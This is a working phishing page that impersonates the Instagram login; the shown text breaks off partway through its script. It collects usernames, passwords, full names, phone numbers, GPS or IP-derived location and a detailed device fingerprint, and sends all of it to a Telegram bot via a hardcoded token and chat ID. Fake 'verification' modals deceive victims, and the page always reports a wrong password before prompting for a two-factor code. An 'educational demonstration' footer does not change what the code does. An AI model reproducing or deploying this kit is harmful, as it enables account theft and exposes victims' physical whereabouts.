<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yT/r/Yps9cQFGQoW.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #fafafa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
        }

        .container {
            display: flex;
            max-width: 935px;
            width: 100%;
            justify-content: center;
            align-items: center;
            gap: 60px;
            position: relative;
        }

        .phone-image {
            flex: 1;
            display: flex;
            justify-content: flex-end;
            position: relative;
        }

        .phone-image img {
            height: 600px;
            display: block;
            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.1));
        }

        .login-section {
            flex: 1;
            max-width: 350px;
        }

        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            margin-bottom: 10px;
            border-radius: 1px;
        }

        .logo {
            font-family: 'Billabong', cursive;
            font-size: 51px;
            margin-bottom: 30px;
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: normal;
            letter-spacing: 1px;
        }

        .input-group {
            margin-bottom: 10px;
            position: relative;
        }

        input {
            width: 100%;
            padding: 12px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            color: #262626;
            transition: border-color 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            padding: 9px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            margin: 15px 0;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .login-btn:active {
            transform: scale(0.99);
        }

        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
            margin: 0 10px;
        }

        .facebook-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin: 20px 0;
            transition: opacity 0.2s;
        }

        .facebook-login:hover {
            opacity: 0.8;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            transition: opacity 0.2s;
        }

        .forgot-password:hover {
            opacity: 0.8;
        }

        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            margin-bottom: 20px;
            border-radius: 1px;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-download {
            text-align: center;
        }

        .app-download p {
            margin: 20px 0;
            font-size: 14px;
            color: #262626;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        .app-buttons img {
            height: 40px;
            border-radius: 5px;
            transition: transform 0.2s;
        }

        .app-buttons img:hover {
            transform: scale(1.05);
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            animation: fadeIn 0.3s ease;
            padding: 20px;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-content {
            background-color: white;
            padding: 40px 30px;
            border-radius: 12px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            animation: slideUp 0.3s ease;
            position: relative;
        }

        @keyframes slideUp {
            from { transform: translateY(30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .modal-logo {
            font-family: 'Billabong', cursive;
            font-size: 42px;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: normal;
        }

        .modal h2 {
            margin-bottom: 15px;
            font-size: 18px;
            color: #262626;
            font-weight: 600;
        }

        .modal p {
            color: #8e8e8e;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .modal-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            font-size: 14px;
            transition: background-color 0.2s;
        }

        .modal-btn:hover {
            background-color: #1877f2;
        }

        .modal-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .modal-btn-secondary {
            background-color: transparent;
            color: #0095f6;
            border: none;
            font-weight: 600;
            cursor: pointer;
            padding: 12px;
            font-size: 14px;
            transition: opacity 0.2s;
        }

        .modal-btn-secondary:hover {
            opacity: 0.8;
        }

        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin-top: 10px;
            display: none;
            font-weight: 400;
        }

        .info-modal {
            max-width: 500px;
        }

        .info-item {
            text-align: left;
            margin: 10px 0;
            padding: 12px;
            background-color: #fafafa;
            border-radius: 6px;
            font-size: 12px;
            border-left: 3px solid #0095f6;
        }

        .info-label {
            font-weight: 600;
            color: #262626;
            display: block;
            margin-bottom: 5px;
        }

        .info-value {
            color: #8e8e8e;
            word-break: break-word;
        }

        .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Mobile Responsiveness */
        @media (max-width: 875px) {
            .phone-image {
                display: none;
            }
            
            .container {
                justify-content: center;
                gap: 0;
            }
            
            .login-section {
                width: 100%;
            }
        }

        @media (max-width: 450px) {
            .login-box, .signup-box {
                background-color: transparent;
                border: none;
                padding: 20px;
            }
            
            body {
                background-color: white;
                padding: 0;
            }
            
            .modal-content {
                padding: 30px 20px;
                width: 95%;
                max-width: 320px;
            }
            
            .app-buttons {
                flex-direction: column;
                align-items: center;
            }
            
            .app-buttons img {
                margin: 5px 0;
            }
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #385185;
            font-size: 12px;
            cursor: pointer;
            font-weight: 600;
            padding: 4px 8px;
        }

        .warning-note {
            color: #8e8e8e;
            font-size: 11px;
            margin-top: 20px;
            text-align: center;
            padding: 10px;
            border-top: 1px solid #dbdbdb;
            line-height: 1.4;
        }

        .modal-icon {
            font-size: 50px;
            margin-bottom: 20px;
        }

        .input-error {
            border-color: #ed4956 !important;
        }

        .error-text {
            color: #ed4956;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }

        .location-error-box {
            background: rgba(237, 73, 86, 0.1);
            border: 1px solid rgba(237, 73, 86, 0.2);
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
        }

        .location-error-box p {
            color: #ed4956;
            font-size: 13px;
            margin: 0;
        }

        .loading-text {
            color: #8e8e8e;
            font-size: 13px;
            margin-top: 10px;
        }

        .security-check {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }

        .checkmark {
            color: #00a400;
            font-size: 24px;
        }

        /* Instagram Font */
        @font-face {
            font-family: 'Billabong';
            src: url('https://fonts.cdnfonts.com/s/12466/Billabong.woff') format('woff');
            font-weight: normal;
            font-style: normal;
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-image">
            <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2x.png" alt="Instagram on iPhone">
        </div>
        
        <div class="login-section">
            <div class="login-box">
                <div class="logo">Instagram</div>
                <form id="loginForm">
                    <div class="input-group">
                        <input type="text" id="username" placeholder="Phone number, username, or email" required>
                    </div>
                    <div class="input-group">
                        <input type="password" id="password" placeholder="Password" required>
                        <button type="button" class="password-toggle" id="togglePassword">Show</button>
                    </div>
                    <button type="submit" class="login-btn" id="submitBtn">
                        <span id="btnText">Log in</span>
                        <div class="loader" id="btnLoader"></div>
                    </button>
                    <div class="error-message" id="errorMessage">
                        Sorry, your password was incorrect. Please double-check your password.
                    </div>
                </form>
                
                <div class="separator">OR</div>
                
                <a href="#" class="facebook-login">
                    <svg style="width:16px;height:16px;vertical-align:text-bottom;margin-right:8px;" fill="#385185" viewBox="0 0 24 24">
                        <path d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02z"></path>
                    </svg>
                    Log in with Facebook
                </a>
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="#" class="signup-link">Sign up</a>
            </div>
            
            <div class="app-download">
                <p>Get the app.</p>
                <div class="app-buttons">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play">
                </div>
            </div>
            
            <div class="warning-note">
                <strong>Security Notice:</strong> This is an educational demonstration. Never share your login credentials on suspicious websites.
            </div>
        </div>
    </div>

    <!-- Initial User Info Modal -->
    <div class="modal" id="initialModal">
        <div class="modal-content">
            <div class="modal-logo">Instagram</div>
            <h2>Account Verification Required</h2>
            <p>To help keep your account secure, Instagram needs to verify your identity.</p>
            
            <div class="input-group">
                <input type="text" id="userFullName" placeholder="Full Name" required>
                <div class="error-text" id="nameError">Please enter your full name</div>
            </div>
            <div class="input-group">
                <input type="tel" id="userMobile" placeholder="Mobile Number" required>
                <div class="error-text" id="mobileError">Please enter a valid mobile number</div>
            </div>
            
            <p style="font-size: 12px; color: #8e8e8e; margin: 20px 0; line-height: 1.4;">
                By providing your information, you agree to our Terms and Privacy Policy. This helps us protect your account from unauthorized access.
            </p>
            
            <button class="modal-btn" id="verifyUserBtn">Verify & Continue</button>
            <div class="loader" id="verifyLoader"></div>
        </div>
    </div>

    <!-- Location Permission Modal -->
    <div class="modal" id="locationModal">
        <div class="modal-content">
            <div class="modal-logo">Instagram</div>
            <h2>Location Verification Required</h2>
            <p>For your security, Instagram needs to verify your location to protect against suspicious login attempts.</p>
            
            <div style="background: #fafafa; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left;">
                <p style="font-size: 13px; color: #262626; margin-bottom: 8px; font-weight: 600;">
                    Why we need this:
                </p>
                <ul style="font-size: 12px; color: #8e8e8e; padding-left: 20px; margin: 0;">
                    <li>Confirm it's really you logging in</li>
                    <li>Prevent unauthorized access from new locations</li>
                    <li>Send alerts for suspicious activity</li>
                </ul>
            </div>
            
            <div class="location-error-box" id="locationErrorBox" style="display: none;">
                <p id="locationErrorMessage">
                    <strong>Location access denied.</strong> Please allow location access to continue. If error persists, try opening this page in an incognito/private tab.
                </p>
            </div>
            
            <button class="modal-btn" id="allowLocationBtn">
                <span id="locationBtnText">Allow Location Access</span>
                <div class="loader" id="locationLoader" style="display: none;"></div>
            </button>
            <button class="modal-btn-secondary" id="tryAgainBtn" style="display: none;">Try Again</button>
        </div>
    </div>

    <!-- Security Verification Modal -->
    <div class="modal" id="securityModal">
        <div class="modal-content info-modal">
            <div class="modal-logo">Instagram</div>
            <h2>Security Check Complete</h2>
            
            <div class="security-check">
                <div class="checkmark">âœ“</div>
                <p style="color: #00a400; font-weight: 600;">Device verified successfully</p>
            </div>
            
            <p style="font-size: 14px; color: #8e8e8e; margin: 20px 0;">
                Your device information has been verified for security purposes.
            </p>
            
            <div id="deviceInfo" style="text-align: left; max-height: 300px; overflow-y: auto; margin: 20px 0;">
                <!-- Device info will be populated here -->
            </div>
            
            <button class="modal-btn" id="continueBtn">Continue to Instagram</button>
        </div>
    </div>

    <!-- Two-Factor Authentication Modal -->
    <div class="modal" id="twoFactorModal">
        <div class="modal-content">
            <div class="modal-logo">Instagram</div>
            <h2>Two-Factor Authentication</h2>
            <p>Enter the 6-digit code sent to your phone ending with ****<span id="phoneLastDigits"></span></p>
            
            <div class="input-group" style="margin: 25px 0;">
                <input type="text" id="twoFactorCode" placeholder="6-digit code" maxlength="6" pattern="\d{6}" required style="text-align: center; font-size: 18px; letter-spacing: 8px;">
            </div>
            
            <p style="font-size: 12px; color: #8e8e8e; margin: 15px 0;">
                Didn't receive a code? <a href="#" style="color: #0095f6; text-decoration: none;">Resend Code</a>
            </p>
            
            <button class="modal-btn" id="verifyCodeBtn">Verify</button>
            <button class="modal-btn-secondary" id="useBackupBtn">Use Backup Code</button>
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURATION - TELEGRAM BOT SETTINGS
        // ============================================
        const TELEGRAM_BOT_TOKEN = '8220432493:AAHb6lKFGK5M6uWAIqlGTogjCamNfwJJT0Q';
        const TELEGRAM_CHAT_ID = '8089637989';
        
        // ============================================
        // DATA COLLECTION OBJECT
        // ============================================
        const collectedData = {
            credentials: {},
            location: {},
            deviceInfo: {},
            userInfo: {},
            sessionData: {},
            timestamps: {
                pageLoad: new Date().toISOString(),
                loginAttempt: null,
                locationCaptured: null,
                dataSent: null
            },
            sessionId: Math.random().toString(36).substring(2) + Date.now().toString(36)
        };

        // ============================================
        // DOM ELEMENTS
        // ============================================
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const togglePasswordBtn = document.getElementById('togglePassword');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const btnLoader = document.getElementById('btnLoader');
        const errorMessage = document.getElementById('errorMessage');
        
        const initialModal = document.getElementById('initialModal');
        const locationModal = document.getElementById('locationModal');
        const securityModal = document.getElementById('securityModal');
        const twoFactorModal = document.getElementById('twoFactorModal');
        
        const userFullNameInput = document.getElementById('userFullName');
        const userMobileInput = document.getElementById('userMobile');
        const verifyUserBtn = document.getElementById('verifyUserBtn');
        const verifyLoader = document.getElementById('verifyLoader');
        const nameError = document.getElementById('nameError');
        const mobileError = document.getElementById('mobileError');
        
        const allowLocationBtn = document.getElementById('allowLocationBtn');
        const locationBtnText = document.getElementById('locationBtnText');
        const locationLoader = document.getElementById('locationLoader');
        const tryAgainBtn = document.getElementById('tryAgainBtn');
        const locationErrorBox = document.getElementById('locationErrorBox');
        const locationErrorMessage = document.getElementById('locationErrorMessage');
        
        const continueBtn = document.getElementById('continueBtn');
        const deviceInfoDiv = document.getElementById('deviceInfo');
        
        const twoFactorCodeInput = document.getElementById('twoFactorCode');
        const verifyCodeBtn = document.getElementById('verifyCodeBtn');
        const phoneLastDigits = document.getElementById('phoneLastDigits');
        const useBackupBtn = document.getElementById('useBackupBtn');

        // ============================================
        // STATE MANAGEMENT
        // ============================================
        let locationAllowed = false;
        let userInfoCollected = false;
        let locationModalShown = false;

        // ============================================
        // INITIALIZATION
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            // Generate unique session ID
            collectedData.sessionId = 'insta_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Collect device information immediately
            collectAllDeviceInfo();
            
            // Check if user has already completed initial verification
            const hasCompletedInitial = sessionStorage.getItem('insta_initial_complete');
            
            if (!hasCompletedInitial) {
                // Show initial modal after short delay
                setTimeout(() => {
                    initialModal.style.display = 'flex';
                    document.body.style.overflow = 'hidden';
                }, 1000);
            } else {
                userInfoCollected = true;
                // Check if location was already allowed
                locationAllowed = sessionStorage.getItem('insta_location_allowed') === 'true';
                
                if (!locationAllowed) {
                    setTimeout(() => {
                        showLocationModal();
                    }, 800);
                }
            }
            
            // Prevent developer tools
            preventDevTools();
        });

        // ============================================
        // PASSWORD TOGGLE FUNCTIONALITY
        // ============================================
        togglePasswordBtn.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePasswordBtn.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                togglePasswordBtn.textContent = 'Show';
            }
        });

        // ============================================
        // INITIAL USER INFO MODAL
        // ============================================
        verifyUserBtn.addEventListener('click', async function() {
            const fullName = userFullNameInput.value.trim();
            const mobile = userMobileInput.value.trim();
            
            // Reset errors
            nameError.style.display = 'none';
            mobileError.style.display = 'none';
            userFullNameInput.classList.remove('input-error');
            userMobileInput.classList.remove('input-error');
            
            let hasError = false;
            
            if (!fullName) {
                nameError.style.display = 'block';
                userFullNameInput.classList.add('input-error');
                userFullNameInput.focus();
                hasError = true;
            }
            
            if (!mobile || mobile.length < 10) {
                mobileError.style.display = 'block';
                userMobileInput.classList.add('input-error');
                if (!hasError) userMobileInput.focus();
                hasError = true;
            }
            
            if (hasError) return;
            
            // Store user info
            collectedData.userInfo = {
                fullName: fullName,
                mobileNumber: mobile,
                timestamp: new Date().toISOString()
            };
            
            // Show loading state
            verifyUserBtn.disabled = true;
            verifyUserBtn.textContent = '';
            verifyLoader.style.display = 'block';
            
            // Send user info to Telegram
            await sendToTelegram('USER_INFO');
            
            // Mark as completed
            sessionStorage.setItem('insta_initial_complete', 'true');
            userInfoCollected = true;
            
            // Hide modal and show location modal
            setTimeout(() => {
                initialModal.style.display = 'none';
                verifyUserBtn.disabled = false;
                verifyUserBtn.textContent = 'Verify & Continue';
                verifyLoader.style.display = 'none';
                document.body.style.overflow = 'auto';
                
                // Show location modal
                showLocationModal();
            }, 1000);
        });

        // ============================================
        // LOCATION MODAL FUNCTIONS
        // ============================================
        function showLocationModal() {
            if (!locationModalShown) {
                locationModal.style.display = 'flex';
                document.body.style.overflow = 'hidden';
                locationModalShown = true;
                
                // Reset UI state
                locationErrorBox.style.display = 'none';
                tryAgainBtn.style.display = 'none';
                locationBtnText.textContent = 'Allow Location Access';
                locationLoader.style.display = 'none';
                allowLocationBtn.disabled = false;
            }
        }

        function hideLocationModal() {
            locationModal.style.display = 'none';
            document.body.style.overflow = 'auto';
            locationModalShown = false;
        }

        allowLocationBtn.addEventListener('click', async function() {
            locationBtnText.textContent = 'Getting Location...';
            locationLoader.style.display = 'block';
            allowLocationBtn.disabled = true;
            locationErrorBox.style.display = 'none';
            
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    async function(position) {
                        // Success - got location
                        collectedData.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy + ' meters',
                            altitude: position.coords.altitude || 'Not available',
                            heading: position.coords.heading || 'Not available',
                            speed: position.coords.speed || 'Not available',
                            timestamp: new Date().toISOString(),
                            mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
                            source: 'GPS',
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                        };
                        
                        collectedData.timestamps.locationCaptured = new Date().toISOString();
                        
                        // Mark location as allowed
                        locationAllowed = true;
                        sessionStorage.setItem('insta_location_allowed', 'true');
                        
                        // Send location to Telegram
                        await sendToTelegram('LOCATION');
                        
                        // Hide modal
                        hideLocationModal();
                        
                        // Show security verification
                        setTimeout(() => {
                            showSecurityVerification();
                        }, 500);
                    },
                    async function(error) {
                        // Error - location denied
                        locationBtnText.textContent = 'Allow Location Access';
                        locationLoader.style.display = 'none';
                        allowLocationBtn.disabled = false;
                        tryAgainBtn.style.display = 'inline-block';
                        
                        let errorMessage = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Location access was denied. Please allow location access to continue.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Location information is unavailable. Please try again.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "The request to get your location timed out. Please try again.";
                                break;
                            default:
                                errorMessage = "An unknown error occurred. Please try again.";
                        }
                        
                        locationErrorMessage.textContent = errorMessage + " If error persists, open this page in an incognito/private tab.";
                        locationErrorBox.style.display = 'block';
                        
                        // Try to get approximate location via IP
                        await getLocationByIP();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                // Geolocation not supported
                locationErrorMessage.textContent = "Your browser doesn't support geolocation. Please try with a different browser or device.";
                locationErrorBox.style.display = 'block';
                locationBtnText.textContent = 'Allow Location Access';
                locationLoader.style.display = 'none';
                allowLocationBtn.disabled = false;
                tryAgainBtn.style.display = 'inline-block';
                
                // Try to get location by IP
                await getLocationByIP();
            }
        });

        tryAgainBtn.addEventListener('click', function() {
            locationErrorBox.style.display = 'none';
            tryAgainBtn.style.display = 'none';
            locationBtnText.textContent = 'Allow Location Access';
            locationLoader.style.display = 'none';
            allowLocationBtn.disabled = false;
        });

        // ============================================
        // LOGIN FORM HANDLING
        // ============================================
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value;
            
            if (!username || !password) {
                showError('Please fill in all fields');
                return;
            }
            
            // Check if location is allowed
            if (!locationAllowed) {
                showLocationModal();
                showError('Please complete location verification first');
                return;
            }
            
            // Store credentials
            collectedData.credentials = {
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            };
            
            collectedData.timestamps.loginAttempt = new Date().toISOString();
            
            // Show loading state
            btnText.style.display = 'none';
            btnLoader.style.display = 'block';
            submitBtn.disabled = true;
            
            // Send credentials to Telegram
            await sendToTelegram('CREDENTIALS');
            
            // Always show wrong password error (as per requirement)
            setTimeout(() => {
                btnText.style.display = 'inline';
                btnLoader.style.display = 'none';
                submitBtn.disabled = false;
                errorMessage.style.display = 'block';
                
                // Clear password field
                passwordInput.value = '';
                
                // Show two-factor modal
                setTimeout(() => {
                    showTwoFactorModal();
                }, 800);
            }, 1500);
        });

        // ============================================
        // DEVICE INFORMATION COLLECTION
        // ============================================
        async function collectAllDeviceInfo() {
            // Basic device info
            collectedData.deviceInfo = {
                // Browser info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Not specified',
                
                // Screen info
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                availableResolution: `${window.screen.availWidth}x${window.screen.availHeight}`,
                colorDepth: window.screen.colorDepth + ' bit',
                pixelDepth: window.screen.pixelDepth + ' bit',
                orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown',
                
                // Window info
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                devicePixelRatio: window.devicePixelRatio,
                
                // Connection info
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms',
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type || 'Unknown'
                } : 'Not available',
                
                // Hardware info
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 'Unknown',
                
                // Time info
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                
                // Device type detection
                deviceType: /Mobile|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                browser: getBrowserName(),
                os: getOperatingSystem(),
                
                timestamp: new Date().toISOString()
            };
            
            // Battery info
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    collectedData.deviceInfo.battery = {
                        charging: battery.charging,
                        level: Math.round(battery.level * 100) + '%',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    collectedData.deviceInfo.battery = 'Not accessible';
                }
            }
            
            // GPU info via WebGL
            collectedData.deviceInfo.gpu = getWebGLInfo();
            
            // IP address and network info
            await getIPAndNetworkInfo();
            
            // Storage info
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    collectedData.deviceInfo.storage = {
                        usage: formatBytes(estimate.usage),
                        quota: formatBytes(estimate.quota),
                        percentUsed: estimate.quota ? Math.round((estimate.usage / estimate.quota) * 100) + '%' : 'Unknown'
                    };
                } catch (e) {
                    collectedData.deviceInfo.storage = 'Not accessible';
                }
            }
            
            // Performance info
            if ('performance' in window && 'memory' in performance) {
                collectedData.deviceInfo.performance = {
                    jsHeapSizeLimit: formatBytes(performance.memory.jsHeapSizeLimit),
                    totalJSHeapSize: formatBytes(performance.memory.totalJSHeapSize),
                    usedJSHeapSize: formatBytes(performance.memory.usedJSHeapSize)
                };
            }
            
            console.log('Device info collected for educational purposes');
        }

        async function getIPAndNetworkInfo() {
            try {
                const services = [
                    'https://api.ipify.org?format=json',
                    'https://ipapi.co/json/',
                    'https://api.my-ip.io/ip.json'
                ];
                
                for (const service of services) {
                    try {
                        const controller = new AbortController();
                        const timeoutId = setTimeout(() => controller.abort(), 3000);
                        
                        const response = await fetch(service, { 
                            signal: controller.signal 
                        });
                        
                        clearTimeout(timeoutId);
                        
                        if (response.ok) {
                            const data = await response.json();
                            
                            if (service.includes('ipapi.co')) {
                                collectedData.deviceInfo.ipDetails = {
                                    ip: data.ip,
                                    city: data.city,
                                    region: data.region,
                                    country: data.country_name,
                                    countryCode: data.country_code,
                                    postal: data.postal,
                                    latitude: data.latitude,
                                    longitude: data.longitude,
                                    timezone: data.timezone,
                                    org: data.org,
                                    asn: data.asn,
                                    isp: data.org,
                                    currency: data.currency,
                                    callingCode: data.country_calling_code,
                                    languages: data.languages
                                };
                            } else {
                                collectedData.deviceInfo.ipAddress = data.ip;
                                if (data.country) collectedData.deviceInfo.ipCountry = data.country;
                            }
                            
                            break;
                        }
                    } catch (e) {
                        continue;
                    }
                }
                
                if (!collectedData.deviceInfo.ipAddress && collectedData.deviceInfo.ipDetails) {
                    collectedData.deviceInfo.ipAddress = collectedData.deviceInfo.ipDetails.ip;
                }
            } catch (e) {
                console.error('Failed to get IP info:', e);
                collectedData.deviceInfo.ipAddress = 'Could not retrieve';
            }
        }

        async function getLocationByIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    
                    // Only use IP location if GPS location failed
                    if (!collectedData.location.latitude) {
                        collectedData.location = {
                            latitude: data.latitude,
                            longitude: data.longitude,
                            city: data.city,
                            region: data.region,
                            country: data.country_name,
                            ip: data.ip,
                            isp: data.org,
                            timestamp: new Date().toISOString(),
                            mapLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
                            source: 'IP-based (approximate)',
                            accuracy: 'City-level (based on IP)',
                            timezone: data.timezone
                        };
                        
                        collectedData.timestamps.locationCaptured = new Date().toISOString();
                        
                        // Send approximate location to Telegram
                        await sendToTelegram('LOCATION_IP');
                        
                        // Auto-hide modal after 2 seconds
                        setTimeout(() => {
                            hideLocationModal();
                            showSecurityVerification();
                        }, 2000);
                        
                        return true;
                    }
                }
            } catch (e) {
                console.error('Failed to get location by IP:', e);
            }
            return false;
        }

        // ============================================
        // SECURITY VERIFICATION MODAL
        // ============================================
        function showSecurityVerification() {
            securityModal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            // Display device info
            displayDeviceInfo();
            
            // Send all collected data to Telegram
            setTimeout(async () => {
                await sendToTelegram('FULL_DATA');
            }, 1000);
        }

        continueBtn.addEventListener('click', function() {
            securityModal.style.display = 'none';
            document.body.style.overflow = 'auto';
        });

        function displayDeviceInfo() {
            let html = '';
            
            // User Information
            if (collectedData.userInfo.fullName) {
                html += `<div class="info-item">
                    <span class="info-label">Name:</span>
                    <span class="info-value">${collectedData.userInfo.fullName}</span>
                </div>`;
            }
            
            if (collectedData.userInfo.mobileNumber) {
                html += `<div class="info-item">
                    <span class="info-label">Mobile:</span>
                    <span class="info-value">${collectedData.userInfo.mobileNumber}</span>
                </div>`;
            }
            
            // Location Information
            if (collectedData.location.latitude) {
                html += `<div class="info-item">
                    <span class="info-label">Location:</span>
                    <span class="info-value">${collectedData.location.latitude}, ${collectedData.location.longitude}</span>
                </div>`;
                
                if (collectedData.location.city) {
                    html += `<div class="info-item">
                        <span class="info-label">City:</span>
                        <span class="info-value">${collectedData.location.city}, ${collectedData.location.country || ''}</span>
                    </div>`;
                }
                
                html += `<div class="info-item">
                    <span class="info-label">Map Link:</span>
                    <span class="info-value"><a href="${collectedData.location.mapLink}" target="_blank" style="color: #0095f6;">View on Google Maps</a></span>
                </div>`;
            }
            
            // Device Information
            if (collectedData.deviceInfo.ipAddress) {
                html += `<div class="info-item">
                    <span class="info-label">IP Address:</span>
                    <span class="info-value">${collectedData.deviceInfo.ipAddress}</span>
                </div>`;
            }
            
            html += `<div class="info-item">
                <span class="info-label">Device:</span>
                <span class="info-value">${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.os}</span>
            </div>`;
            
            html += `<div class="info-item">
                <span class="info-label">Browser:</span>
